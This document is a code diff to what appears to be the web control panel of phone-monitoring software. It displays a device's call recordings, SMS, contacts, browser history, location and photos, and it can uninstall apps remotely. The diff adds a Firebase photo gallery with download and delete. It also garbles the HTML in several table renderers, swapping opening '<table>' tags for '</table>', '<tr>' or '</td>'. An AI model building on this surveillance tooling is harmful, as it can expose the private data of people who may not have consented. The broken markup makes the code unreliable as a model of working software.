@@ -200,6 +200,61 @@
         .call-recording-details { font-size: 12px; color: var(--text-sec); margin-top: 4px; }
         .download-recording-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: var(--radius-sm); cursor: pointer; font-weight: 500; transition: 0.2s; }
         .download-recording-btn:hover { background: var(--primary-hover); transform: scale(1.02); }
+        /* Photo gallery grid */
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .photo-tile {
+            position: relative;
+            cursor: pointer;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #f0f0f0;
+            aspect-ratio: 1;
+            transition: transform 0.2s;
+        }
+        .photo-tile:hover {
+            transform: scale(1.02);
+        }
+        .photo-tile img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .photo-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            font-size: 10px;
+            padding: 4px 6px;
+            text-align: center;
+        }
+        .fullscreen-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 30000;
+            flex-direction: column;
+        }
+        .fullscreen-modal img {
+            max-width: 90vw;
+            max-height: 80vh;
+            object-fit: contain;
+        }
+        .modal-buttons {
+            margin-top: 20px;
+            display: flex;
+            gap: 16px;
+        }
         @media (max-width: 768px) {
             #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: var(--shadow-lg); width: 280px; }
             #sidebar.open { transform: translateX(0); }
@@ -289,6 +344,7 @@ let mediaRecorder = null, recordedChunks = [], pendingCommand = null, newAlerts 
 let screenMediaRecorder = null, screenRecordedChunks = [];
 let currentCameraStream = null, currentAudioStream = null;
 let socialMsgsData = [], currentLocation = null;
+let deviceInfoRefreshInterval = null;
 
 const panel = document.getElementById('main-panel');
 const statusEl = document.getElementById('status');
@@ -339,7 +395,7 @@ async function handleAuth(){
         loadDevices();
     }catch(e){err.innerText=e.message; btn.innerText=isLoginMode?'Sign In':'Sign Up';}
 }
-function logout(){ auth.signOut().then(()=>{ document.getElementById('deviceListContainer').style.display='none'; document.getElementById('sidebar').style.display='none'; document.getElementById('main').style.display='none'; document.getElementById('authContainer').style.display='flex'; if(ws)ws.close(); selectedDeviceId=null; isLoginMode=true; renderAuthForm(); }); }
+function logout(){ auth.signOut().then(()=>{ document.getElementById('deviceListContainer').style.display='none'; document.getElementById('sidebar').style.display='none'; document.getElementById('main').style.display='none'; document.getElementById('authContainer').style.display='flex'; if(ws)ws.close(); selectedDeviceId=null; isLoginMode=true; renderAuthForm(); if(deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval); }); }
 async function loadDevices(){
     if(!currentUser)return;
     const snap=await db.collection('devices').where('userId','==',currentUser.uid).get();
@@ -356,6 +412,7 @@ window.leaveDevice = function() {
     document.getElementById('deviceListContainer').style.display='flex';
     document.getElementById('headerLeaveBtn').style.display='none';
     if(ws)ws.close();
+    if(deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);
 };
 window.addEventListener('popstate', (e) => { if(!e.state || e.state.view !== 'device') { if(selectedDeviceId) leaveDevice(); } });
 function selectDevice(id,name){
@@ -365,8 +422,29 @@ function selectDevice(id,name){
     document.getElementById('deviceListContainer').style.display='none';
     document.getElementById('sidebar').style.display='';
     document.getElementById('main').style.display='flex';
-    document.getElementById('serverInfo').innerText=`Device: ${name||id}`;
+    document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(name||id)} <span style="font-size:12px; color:#666;" id="lastSeenSpan"></span>`;
     connectWebSocket();
+    loadDeviceInfoAndSchedule();
+}
+async function loadDeviceInfoAndSchedule() {
+    if(!selectedDeviceId || !currentUser) return;
+    await loadDeviceInfo();
+    if(deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval);
+    deviceInfoRefreshInterval = setInterval(() => loadDeviceInfo(), 30000);
+}
+async function loadDeviceInfo() {
+    if(!selectedDeviceId || !currentUser) return;
+    try {
+        const doc = await db.collection('devices').doc(selectedDeviceId).get();
+        if(doc.exists) {
+            const data = doc.data();
+            const name = data.name || 'Unnamed';
+            const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleString() : 'Never';
+            document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(name)} <span style="font-size:12px; color:#666;">(last seen: ${escapeHtml(lastSeen)})</span>`;
+        } else {
+            document.getElementById('serverInfo').innerHTML = `Device: ${escapeHtml(selectedDeviceId)} <span style="font-size:12px; color:#666;">(no info)</span>`;
+        }
+    } catch(e) { console.warn('Failed to load device info:', e); }
 }
 
 // ==================== WEBSOCKET ====================
@@ -650,7 +728,7 @@ async function showCallRecordingsPanel() {
             // Top‑level collection – must filter by userId!
             snapshot = await db.collection('call_recordings')
                 .where('deviceId', '==', selectedDeviceId)
-                .where('userId', '==', currentUser.uid)   // 🔥 FIXED
+                .where('userId', '==', currentUser.uid)
                 .orderBy('timestamp', 'desc')
                 .get();
         }
@@ -738,10 +816,113 @@ async function showCallRecordingsPanel() {
     }
 }
 
+// ==================== PHOTO GALLERY (Firebase) ====================
+async function showPhotoGalleryPanel() {
+    if (!selectedDeviceId) {
+        panel.innerHTML = '<p>No device selected.</p>';
+        return;
+    }
+    if (!currentUser) {
+        panel.innerHTML = '<p>You must be logged in.</p>';
+        return;
+    }
+    panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><p>Loading photos from Firebase...</p>';
+    try {
+        // Query photos from Firestore collection "photos" (or subcollection under device)
+        let snapshot = null;
+        try {
+            snapshot = await db.collection('devices').doc(selectedDeviceId).collection('photos')
+                .orderBy('timestamp', 'desc')
+                .get();
+        } catch(e) {}
+        if (!snapshot || snapshot.empty) {
+            snapshot = await db.collection('photos')
+                .where('deviceId', '==', selectedDeviceId)
+                .where('userId', '==', currentUser.uid)
+                .orderBy('timestamp', 'desc')
+                .get();
+        }
+        if (snapshot.empty) {
+            panel.innerHTML = `
+                <h3>🖼️ Photo Gallery</h3>
+                <p>No photos found in Firebase. You can fetch recent images directly from the device (if available).</p>
+                <button id="fallbackGalleryBtn" class="btn-ui primary">📸 Fetch from Device</button>
+            `;
+            document.getElementById('fallbackGalleryBtn')?.addEventListener('click', () => {
+                sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                showNotification('Fetching recent images from device...');
+            });
+            return;
+        }
+        let html = '<h3>🖼️ Photo Gallery (Firebase)</h3><div class="photo-grid" id="photoGrid"></div>';
+        panel.innerHTML = html;
+        const grid = document.getElementById('photoGrid');
+        snapshot.forEach(doc => {
+            const photo = doc.data();
+            const imageUrl = photo.imageUrl;
+            const timestamp = photo.timestamp ? new Date(photo.timestamp).toLocaleString() : '';
+            const thumb = photo.thumb ? `data:image/jpeg;base64,${photo.thumb}` : imageUrl;
+            const tile = document.createElement('div');
+            tile.className = 'photo-tile';
+            tile.innerHTML = `
+                <img src="${thumb}" loading="lazy" onerror="this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%20100%22%3E%3Crect%20width%3D%22100%22%20height%3D%22100%22%20fill%3D%22%23ddd%22%2F%3E%3Ctext%20x%3D%2250%22%20y%3D%2255%22%20text-anchor%3D%22middle%22%20fill%3D%22%23999%22%3E📷%3C%2Ftext%3E%3C%2Fsvg%3E'">
+                <div class="photo-overlay">${escapeHtml(timestamp)}</div>
+            `;
+            tile.addEventListener('click', () => showFullPhoto(photo.imageUrl, doc.id, photo.storagePath));
+            grid.appendChild(tile);
+        });
+    } catch (err) {
+        console.error(err);
+        panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p style="color:red;">Error loading photos: ${err.message}</p><button id="fallbackGalleryBtn2" class="btn-ui primary">Fetch from Device</button>`;
+        document.getElementById('fallbackGalleryBtn2')?.addEventListener('click', () => {
+            sendCommand('GET_RECENT_IMAGES', { days: 5 });
+            showNotification('Fetching recent images from device...');
+        });
+    }
+}
+function showFullPhoto(imageUrl, photoId, storagePath) {
+    const modal = document.createElement('div');
+    modal.className = 'fullscreen-modal';
+    modal.innerHTML = `
+        <img src="${imageUrl}" alt="Full photo">
+        <div class="modal-buttons">
+            <button id="downloadPhotoBtn" class="btn-ui primary">💾 Download</button>
+            <button id="deletePhotoBtn" class="btn-ui secondary" style="background:#d32f2f; color:white;">🗑️ Delete</button>
+            <button id="closeModalBtn" class="btn-ui secondary">✕ Close</button>
+        </div>
+    `;
+    document.body.appendChild(modal);
+    document.getElementById('downloadPhotoBtn').onclick = async () => {
+        try {
+            showNotification('Downloading...');
+            const response = await fetch(imageUrl);
+            const blob = await response.blob();
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `photo_${Date.now()}.jpg`;
+            a.click();
+            URL.revokeObjectURL(a.href);
+            showNotification('Download complete');
+        } catch(e) { showNotification('Download failed'); }
+    };
+    document.getElementById('deletePhotoBtn').onclick = async () => {
+        if(!confirm('Delete this photo permanently?')) return;
+        try {
+            if(photoId) await db.collection('photos').doc(photoId).delete();
+            if(storagePath) await storage.ref(storagePath).delete();
+            showNotification('Photo deleted');
+            modal.remove();
+            showPhotoGalleryPanel(); // refresh
+        } catch(e) { showNotification('Delete failed: ' + e.message); }
+    };
+    document.getElementById('closeModalBtn').onclick = () => modal.remove();
+    modal.addEventListener('click', (e) => { if(e.target === modal) modal.remove(); });
+}
+
 // ==================== OTHER DISPLAY FUNCTIONS (unchanged) ====================
 function renderTable(rows,headers){
     const pageSize=20,total=Math.ceil(rows.length/pageSize),start=currentPage*pageSize;
-    let html='<div style="overflow-x:auto;"><table><thead><tr>'+headers.map(h=>`<th>${h}</th>`).join('')+'</thead><tbody>';
+    let html='<div style="overflow-x:auto;"></table><thead><tr>'+headers.map(h=>`<th>${h}</th>`).join('')+'</thead><tbody>';
     rows.slice(start,start+pageSize).forEach(r=>{ html+='<tr>'+r.map(c=>`<td>${escapeHtml(c||'')}</td>`).join('')+'</tr>'; });
     html+='</tbody></table></div>';
     if(total>1){ html+='<div class="pagination">'; for(let i=0;i<total;i++) html+=`<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`; html+='</div>'; }
@@ -755,21 +936,21 @@ function displaySMS(data){
 }
 function displayContacts(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
-    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><tr><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
 }
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><tr><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
 function displayBrowserHistory(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"></td><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
 }
 function displayWifiNetworks(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>'; return; }
-    panel.innerHTML=`<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars=n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░'; return `<tr style="${n.connected?'background:#f0fff4':''}"><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars=n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░'; return `<tr style="${n.connected?'background:#f0fff4':''}"><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`;
 }
 function displayAppUsage(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>'; return; }
@@ -858,12 +1039,7 @@ function showLocationHistoryPanel() {
     sendCommand('GET_LOCATION_HISTORY',{days:3});
 }
 function displayLocationHistory(data) { /* simplified */ panel.innerHTML = '<p>History loaded (simplified)</p>'; }
-function showPhotoGalleryPanel(){
-    panel.innerHTML='<h3>🖼️ Photo Gallery</h3><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>';
-    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_RECENT_IMAGES',{days:parseInt(btn.dataset.days)}));
-    sendCommand('GET_RECENT_IMAGES',{days:5});
-}
-function displayPhotoGallery(data){ /* simplified */ panel.innerHTML = '<p>Gallery loaded</p>'; }
+function displayPhotoGallery(data){ /* legacy fallback */ if(data && Array.isArray(data)) showPhotoGalleryPanel(); else showPhotoGalleryPanel(); }
 function showAppEventsPanel(){
     panel.innerHTML='<h3>📦 App & Call Events</h3><p>App installs/removals and call events from device.</p><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="appEventsList"></div>';
     panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_APP_EVENTS',{days:parseInt(btn.dataset.days)}));
